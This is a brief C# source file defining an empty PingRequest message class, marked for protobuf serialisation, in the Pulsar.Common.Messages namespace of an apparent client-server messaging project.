using System;
using ProtoBuf;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages
{
    [ProtoContract]
    public class PingRequest : IMessage
    {
    }
}
